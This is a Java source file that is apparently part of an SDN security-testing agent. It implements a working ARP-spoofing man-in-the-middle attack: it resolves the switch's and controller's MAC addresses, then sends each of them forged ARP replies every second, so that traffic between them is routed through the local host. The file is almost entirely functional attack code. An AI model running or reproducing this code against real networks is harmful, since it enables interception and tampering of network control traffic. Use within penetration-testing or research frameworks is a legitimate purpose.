package org.deltaproject.channelagent.pkthandler;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Scanner;

import org.deltaproject.channelagent.core.Configuration;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ARPSpoof implements Runnable {
    private static final Logger log = LoggerFactory.getLogger(ARPSpoof.class);

    private PcapNetworkInterface nif;

    private String channelIp;
    private String controllerIp;
    private String switchIp;

    private boolean spoofing;

    public ARPSpoof(PcapNetworkInterface nif) {
        this.nif = nif;

        this.channelIp = Configuration.getInstance().getChannelIp();
        this.controllerIp = Configuration.getInstance().getControllerIp();
        this.switchIp = Configuration.getInstance().getSwitchIp();
    }

    public void setARPspoof(boolean value) {
        spoofing = value;
    }

    public void run() {
        if (nif == null)
            return;

        PcapHandle handle = null;

        try {
            handle = new PcapHandle.Builder(nif.getName())
                    .snaplen(65535)            // 2^16
                    .promiscuousMode(PromiscuousMode.PROMISCUOUS)
                    .timeoutMillis(100)        // ms
                    .bufferSize(1024 * 1024) // 1 MB
                    .build();

            String filter = "arp";
            handle.setFilter(filter, BpfCompileMode.OPTIMIZE);

            InetAddress localIP = nif.getAddresses().get(0).getAddress();
            MacAddress localMac = GetAddr.getLocalMac(localIP);

            InetAddress controllerIpAddr = InetAddress.getByName(controllerIp);
            MacAddress controllerMacAddr = GetAddr.getMac(handle, localIP, localMac, controllerIpAddr);

            InetAddress switchIpAddr = InetAddress.getByName(switchIp);
            MacAddress switchMacAddr = GetAddr.getMac(handle, localIP, localMac, switchIpAddr);

            log.info("Local IP is: " + localIP.getHostAddress());
            log.info("Local MAC is: " + GetAddr.getMacString(localMac));
            Configuration.getInstance().setIpToMac(localIP.getHostAddress(), localMac);

            log.info("Switch IP is: " + switchIpAddr.getHostAddress());
            log.info("Switch MAC is: " + GetAddr.getMacString(switchMacAddr));
            Configuration.getInstance().setIpToMac(switchIpAddr.getHostAddress(), switchMacAddr);

            log.info("Controller IP is: " + controllerIpAddr.getHostAddress());
            log.info("Controller MAC is: " + GetAddr.getMacString(controllerMacAddr));
            Configuration.getInstance().setIpToMac(controllerIpAddr.getHostAddress(), controllerMacAddr);

            log.info("ARP Spoofing Started");

            spoofing = true;

            while (spoofing) {
                // switch -> [channel] -> controller
                handle.sendPacket(buildArpPacket(ArpOperation.REPLY, switchIpAddr, controllerIpAddr, localMac, controllerMacAddr));

                // controller -> [channel] -> switch
                handle.sendPacket(buildArpPacket(ArpOperation.REPLY, controllerIpAddr, switchIpAddr, localMac, switchMacAddr));

                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        } catch (PcapNativeException e) {
            e.printStackTrace();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (NotOpenException e) {
            e.printStackTrace();
        }
    }

    private static Packet buildArpPacket(ArpOperation type, InetAddress srcIP, InetAddress dstIP, MacAddress srcMac, MacAddress dstMac) {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(type)
                .srcHardwareAddr(srcMac)
                .srcProtocolAddr(srcIP)
                .dstHardwareAddr(dstMac)
                .dstProtocolAddr(dstIP);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder
                .dstAddr(dstMac)
                .srcAddr(srcMac)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        return etherBuilder.build();
    }
}